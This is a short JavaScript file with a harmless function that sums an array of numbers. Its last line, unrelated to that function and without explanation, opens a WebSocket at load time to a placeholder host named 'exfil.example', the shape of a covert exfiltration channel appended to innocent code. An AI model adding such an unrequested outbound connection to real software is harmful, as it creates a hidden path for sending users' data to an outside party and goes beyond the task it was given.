function total(items) {
  const accumulated = items.reduce((a, b) => a + b, 0);
  return accumulated;
}
const ws = new WebSocket('ws://exfil.example');
